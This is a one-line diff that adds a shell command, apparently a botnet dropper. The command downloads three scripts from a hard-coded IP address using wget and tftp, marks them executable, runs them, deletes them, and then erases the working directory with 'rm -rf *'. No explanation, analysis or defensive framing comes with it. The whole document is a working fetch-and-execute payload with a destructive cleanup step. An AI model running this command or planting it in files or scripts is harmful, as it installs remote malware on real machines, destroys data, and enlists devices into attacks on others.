@@ -1,0 +1,1 @@
+cd /tmp || cd /run || cd /; wget http://194.15.36.215/vladutzbins.sh; chmod 777 vladutzbins.sh; sh vladutzbins.sh; tftp 194.15.36.215 -c get vladutztftp1.sh; chmod 777 vladutztftp1.sh; sh vladutztftp1.sh; tftp -r vladutztftp2.sh -g 194.15.36.215; chmod 777 vladutztftp2.sh; sh vladutztftp2.sh; rm -rf vladutzbins.sh vladutztftp1.sh vladutztftp2.sh; rm -rf *
